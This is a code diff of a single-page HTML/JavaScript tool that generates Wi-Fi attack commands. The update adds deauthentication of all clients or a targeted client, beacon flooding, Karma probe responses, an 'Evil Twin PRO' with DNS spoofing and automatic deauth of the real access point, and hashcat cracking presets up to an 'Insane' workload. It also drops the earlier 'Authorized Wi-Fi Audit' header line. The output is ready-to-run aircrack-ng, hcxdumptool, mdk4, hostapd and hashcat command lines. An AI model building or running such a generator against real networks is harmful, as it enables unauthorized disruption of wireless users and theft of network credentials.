@@ -2,120 +2,134 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Kali Wi-Fi Audit Command Generator</title>
+<title>Wi‑Fi Audit Command Generator – MAX v1.0.0</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
-html, body {
-  max-width: 100%;
-  overflow-x: hidden;
-  margin: 0;
-  font-family: system-ui, -apple-system, Segoe UI, Roboto;
-  background: #0f1220;
-  color: #e6e8ff;
+:root{
+  --bg:#0f1220;
+  --card:#171a2b;
+  --line:#24284a;
+  --txt:#e6e8ff;
+  --muted:#9aa0ff;
+  --acc:#4f8cff;
+  --warn:#ffb84f;
+  --ok:#4cff8f;
 }
 
-.wrapper {
-  max-width: 420px;
-  margin: auto;
-  padding: 12px;
+*{box-sizing:border-box}
+
+body{
+  margin:0;
+  font-family:system-ui,-apple-system,Segoe UI,Roboto;
+  background:var(--bg);
+  color:var(--txt);
 }
 
-h1 { font-size: 20px; margin: 8px 0; }
-h2 { font-size: 15px; margin: 0 0 10px; }
-.small { font-size: 12px; color: #9aa0ff; margin-bottom: 8px; }
-
-.card {
-  background: #171a2b;
-  border: 1px solid #24284a;
-  border-radius: 14px;
-  padding: 14px;
-  margin-bottom: 14px;
+.wrapper{
+  max-width:460px;
+  margin:auto;
+  padding:12px;
 }
 
-label.field {
-  display: block;
-  font-size: 13px;
-  color: #9aa0ff;
-  margin-top: 6px;
+h1{font-size:20px;margin:6px 0}
+h2{font-size:15px;margin:0 0 10px}
+h3{font-size:13px;margin:0 0 6px;color:var(--muted)}
+.small{font-size:12px;color:var(--muted)}
+
+.card{
+  background:var(--card);
+  border:1px solid var(--line);
+  border-radius:14px;
+  padding:14px;
+  margin-bottom:14px;
 }
 
-input, select {
-  width: 100%;
-  margin-top: 4px;
-  margin-bottom: 10px;
-  background: #0b0d1a;
-  color: #e6e8ff;
-  border: 1px solid #24284a;
-  border-radius: 10px;
-  padding: 12px;
-  font-size: 14px;
+label.field{
+  display:block;
+  font-size:13px;
+  color:var(--muted);
+  margin-top:6px;
 }
 
-/* ===== CHECKBOX LABEL FIX ===== */
-label.checkbox-label {
-  display: block;
-  font-size: 14px;
-  color: #e6e8ff;
-  margin-bottom: 10px;
-  cursor: pointer;
+input, select, textarea{
+  width:100%;
+  margin-top:4px;
+  margin-bottom:10px;
+  background:#0b0d1a;
+  color:var(--txt);
+  border:1px solid var(--line);
+  border-radius:10px;
+  padding:10px;
+  font-size:14px;
 }
 
-label.checkbox-label input {
-  margin-right: 8px;
+textarea{min-height:70px}
+
+label.cb{
+  display:block;
+  margin-bottom:8px;
+  cursor:pointer;
+  font-size:14px;
 }
 
-/* OUTPUT */
-pre {
-  background: #050610;
-  border-radius: 12px;
-  padding: 12px;
-  font-size: 12px;
-  white-space: pre-wrap;
-  word-break: break-word;
-  overflow-wrap: anywhere;
-  max-width: 100%;
-  overflow: auto;
+label.cb input{margin-right:8px}
+
+details summary{
+  cursor:pointer;
+  font-size:14px;
+  color:var(--acc);
+  margin-bottom:8px;
 }
 
-button {
-  width: 100%;
-  padding: 15px;
-  border: none;
-  border-radius: 14px;
-  font-size: 16px;
-  font-weight: 600;
+.badge{
+  display:inline-block;
+  font-size:11px;
+  padding:2px 6px;
+  border-radius:6px;
+  background:#0008;
+  color:var(--warn);
+  margin-left:6px;
 }
 
-.primary { background: #4f8cff; color: #fff; }
-.secondary {
-  background: #0b0d1a;
-  color: #e6e8ff;
-  border: 1px solid #24284a;
-  margin-top: 8px;
+pre{
+  background:#050610;
+  border-radius:12px;
+  padding:12px;
+  font-size:12px;
+  white-space:pre-wrap;
 }
 
-.sticky {
-  position: sticky;
-  bottom: 0;
-  background: linear-gradient(#0000,#0008);
-  padding-top: 10px;
-  padding-bottom: env(safe-area-inset-bottom);
+button{
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:14px;
+  font-size:15px;
+  font-weight:600;
 }
 
-.copy-ok {
-  text-align: center;
-  font-size: 13px;
-  color: #4cff8f;
-  margin-top: 6px;
-  display: none;
+.primary{background:var(--acc);color:#fff}
+.secondary{
+  background:#0b0d1a;
+  color:var(--txt);
+  border:1px solid var(--line);
+  margin-top:8px;
 }
 
-details summary {
-  cursor: pointer;
-  color: #9aa0ff;
-  font-size: 13px;
-  margin-bottom: 8px;
+.copy-ok{
+  display:none;
+  text-align:center;
+  color:var(--ok);
+  font-size:13px;
+  margin-top:6px;
+}
+
+.sticky{
+  position:sticky;
+  bottom:0;
+  background:linear-gradient(#0000,#0008);
+  padding-top:10px;
 }
 </style>
 </head>
@@ -123,10 +137,8 @@ details summary {
 <body>
 <div class="wrapper">
 
-<h1>📡 Wi-Fi Audit Command Generator</h1>
-<div class="small">
-Offline · Command text only · wlan1 = monitor · wlan0 = SSH safe
-</div>
+<h1>📡 Wi‑Fi Audit Command Generator</h1>
+<div class="small">Version v1.0.0‑MAX · Offline · wlan1 monitor only</div>
 
 <!-- TARGET -->
 <div class="card">
@@ -141,136 +153,142 @@ Offline · Command text only · wlan1 = monitor · wlan0 = SSH safe
 <input id="out" value="audit">
 </div>
 
-<!-- SCAN / CAPTURE -->
+<!-- DISCOVERY -->
 <div class="card">
-<h2>Scan / Capture</h2>
-
-<label class="checkbox-label"><input type="checkbox" id="scan" checked> Passive scan (airodump)</label>
-<label class="checkbox-label"><input type="checkbox" id="handshake"> Handshake capture</label>
-<label class="checkbox-label"><input type="checkbox" id="deauth"> Targeted deauth (optional)</label>
+<h2>Monitoring & Discovery</h2>
+<label class="cb"><input type="checkbox" id="scan" checked> Passive scan (airodump)</label>
+<label class="cb"><input type="checkbox" id="scan_all"> All‑channel scan</label>
+<label class="cb"><input type="checkbox" id="clients"> Client‑only tracking</label>
+<label class="cb"><input type="checkbox" id="hidden"> Reveal hidden SSIDs</label>
 </div>
 
-<!-- PMKID -->
+<!-- CLIENT ATTACKS -->
 <div class="card">
-<h2>PMKID</h2>
-<label class="checkbox-label"><input type="checkbox" id="pmkid"> PMKID capture (no client required)</label>
+<h2>Client Attacks</h2>
+<label class="cb"><input type="checkbox" id="deauth_ap"> Deauth AP → all clients</label>
+<label class="cb"><input type="checkbox" id="deauth_client"> Deauth specific client</label>
+<input id="clientmac" placeholder="Client MAC (optional)">
+<label class="field">Deauth count</label>
+<input id="deauthcount" value="5">
 </div>
 
-<!-- CRACK -->
+<!-- HANDSHAKE -->
 <div class="card">
-<h2>Offline Crack</h2>
+<h2>Handshake / PMKID</h2>
+<label class="cb"><input type="checkbox" id="handshake"> Capture WPA handshake</label>
+<label class="cb"><input type="checkbox" id="pmkid"> PMKID capture (no client)</label>
+<label class="cb"><input type="checkbox" id="retry"> Retry capture (loop)</label>
+</div>
 
-<label class="field">Mode</label>
-<select id="crackmode">
-  <option value="">None</option>
-  <option value="wordlist">Wordlist</option>
-  <option value="mask">Mask (non-wordlist)</option>
-  <option value="rule">Rule-based</option>
-  <option value="inc">Incremental</option>
+<!-- AP / BEACON -->
+<div class="card">
+<h2>AP / Beacon Attacks <span class="badge">lab</span></h2>
+<label class="cb"><input type="checkbox" id="beacon"> Beacon flood</label>
+<label class="cb"><input type="checkbox" id="karma"> Karma / probe responder</label>
+<textarea id="ssidlist" placeholder="SSID list (one per line)"></textarea>
+</div>
+
+<!-- EVIL TWIN -->
+<div class="card">
+<h2>Evil Twin PRO <span class="badge">lab</span></h2>
+<label class="cb"><input type="checkbox" id="evil"> Enable Evil Twin</label>
+<label class="field">SSID</label>
+<input id="evilssid">
+<label class="cb"><input type="checkbox" id="dns"> DNS spoof</label>
+<label class="cb"><input type="checkbox" id="auto_deauth"> Auto‑deauth real AP</label>
+</div>
+
+<!-- HASHCAT -->
+<div class="card">
+<h2>Offline Crack (Hashcat)</h2>
+<label class="field">Attack mode</label>
+<select id="attack">
+<option value="">None</option>
+<option value="0">Wordlist</option>
+<option value="1">Combinator</option>
+<option value="3">Mask</option>
+<option value="6">Hybrid WL+Mask</option>
+<option value="7">Hybrid Mask+WL</option>
 </select>
-
-<label class="field">Wordlist / Mask / Rule</label>
-<input id="crackopt" placeholder="rockyou.txt / ?l?l?d?d / rules/best64.rule">
-
-<label class="field">Hashcat mode</label>
-<select id="hashmode">
-  <option value="22000">22000 (WPA/WPA2)</option>
-  <option value="16800">16800 (legacy)</option>
+<input id="wl1" placeholder="Wordlist 1 / mask">
+<input id="wl2" placeholder="Wordlist 2 (if needed)">
+<label class="field">Workload</label>
+<select id="workload">
+<option value="1">Low</option>
+<option value="2">Default</option>
+<option value="3">High</option>
+<option value="4">Insane</option>
 </select>
 </div>
 
-<!-- ADVANCED -->
+<!-- POST -->
 <div class="card">
-<h2>Advanced</h2>
-<details>
-<summary>Lab / Evil Twin</summary>
-
-<label class="checkbox-label"><input type="checkbox" id="evil"> Evil Twin + Captive Portal (lab)</label>
-<label class="field">SSID (optional)</label>
-<input id="ssid" placeholder="Clone or custom">
-
-</details>
+<h2>Post‑Processing</h2>
+<label class="cb"><input type="checkbox" id="convert"> Convert cap → 22000</label>
+<label class="cb"><input type="checkbox" id="validate"> Validate handshake</label>
+<label class="cb"><input type="checkbox" id="strip"> Strip duplicates</label>
 </div>
 
 <!-- OUTPUT -->
 <div class="card">
 <h2>Generated Commands</h2>
 <pre id="outbox"></pre>
-<div class="small" id="count"></div>
-<button class="secondary" onclick="copyCmd()">📋 Copy to clipboard</button>
+<button class="secondary" onclick="copyCmd()">Copy</button>
 <div class="copy-ok" id="copied">Copied ✓</div>
 </div>
 
 <div class="sticky">
-<button class="primary" onclick="generate()">Generate Commands</button>
+<button class="primary" onclick="gen()">Generate Commands</button>
 </div>
 
 </div>
 
 <script>
-function generate(){
-  let b=[], n=0;
-  let B=bssid.value.trim();
-  let C=channel.value.trim();
-  let O=out.value.trim()||"audit";
+function gen(){
+  let b=[];
+  const B=bssid.value.trim();
+  const C=channel.value.trim();
+  const O=out.value.trim()||"audit";
 
-  b.push("# === Authorized Wi-Fi Audit Script ===");
-  b.push("# wlan1 assumed monitor, wlan0 untouched");
-  b.push("");
+  b.push("# Wi‑Fi Audit Script – v1.0.0‑MAX");
+  b.push("# wlan1 monitor only\n");
 
-  if(scan.checked){
-    b.push(`airodump-ng wlan1${C?` -c ${C}`:""}${B?` --bssid ${B}`:""} -w ${O}_scan`);
-    b.push("");
-    n++;
-  }
+  if(scan.checked)
+    b.push(`airodump-ng wlan1 ${C?`-c ${C}`:""} ${B?`--bssid ${B}`:""} -w ${O}_scan\n`);
 
-  if(handshake.checked){
-    b.push(`airodump-ng wlan1${C?` -c ${C}`:""} --bssid ${B} -w ${O}_hs`);
-    if(deauth.checked){
-      b.push(`aireplay-ng --deauth 5 -a ${B} wlan1`);
-    }
-    b.push("");
-    n++;
-  }
+  if(deauth_ap.checked)
+    b.push(`aireplay-ng --deauth ${deauthcount.value} -a ${B} wlan1\n`);
+
+  if(deauth_client.checked)
+    b.push(`aireplay-ng --deauth ${deauthcount.value} -a ${B} -c ${clientmac.value} wlan1\n`);
+
+  if(handshake.checked)
+    b.push(`airodump-ng wlan1 -c ${C} --bssid ${B} -w ${O}_hs\n`);
 
   if(pmkid.checked){
-    b.push(`hcxdumptool -i wlan1 -o ${O}_pmkid.pcapng --enable_status=1`);
-    b.push(`hcxpcapngtool -o ${O}.22000 ${O}_pmkid.pcapng`);
-    b.push("");
-    n++;
+    b.push(`hcxdumptool -i wlan1 -o ${O}.pcapng`);
+    b.push(`hcxpcapngtool -o ${O}.22000 ${O}.pcapng\n`);
   }
 
-  if(crackmode.value){
-    let m=hashmode.value;
-    let opt=crackopt.value;
-    if(crackmode.value==="wordlist")
-      b.push(`hashcat -m ${m} ${O}.22000 ${opt}`);
-    if(crackmode.value==="mask")
-      b.push(`hashcat -m ${m} ${O}.22000 -a 3 ${opt}`);
-    if(crackmode.value==="rule")
-      b.push(`hashcat -m ${m} ${O}.22000 ${opt} -r ${opt}`);
-    if(crackmode.value==="inc")
-      b.push(`hashcat -m ${m} ${O}.22000 -a 3 ?l?l?l?l?d?d`);
-    b.push("");
-    n++;
-  }
+  if(beacon.checked)
+    b.push(`mdk4 wlan1 b -f ssids.txt\n`);
 
   if(evil.checked){
-    b.push("# Evil Twin / Captive (lab)");
-    b.push("hostapd hostapd.conf");
-    b.push("dnsmasq -C dnsmasq.conf");
+    b.push(`# Evil Twin`);
+    b.push(`hostapd hostapd.conf`);
+    if(dns.checked) b.push(`dnsmasq -C dnsmasq.conf`);
     b.push("");
-    n++;
+  }
+
+  if(attack.value){
+    b.push(`hashcat -m 22000 -a ${attack.value} ${O}.22000 ${wl1.value} ${wl2.value||""} -w ${workload.value}\n`);
   }
 
   outbox.textContent=b.join("\n");
-  count.textContent=`Generated sections: ${n}`;
 }
 
 function copyCmd(){
-  let t=outbox.textContent;
-  if(!t) return;
-  navigator.clipboard.writeText(t).then(()=>{
+  navigator.clipboard.writeText(outbox.textContent).then(()=>{
     copied.style.display="block";
     setTimeout(()=>copied.style.display="none",1500);
   });
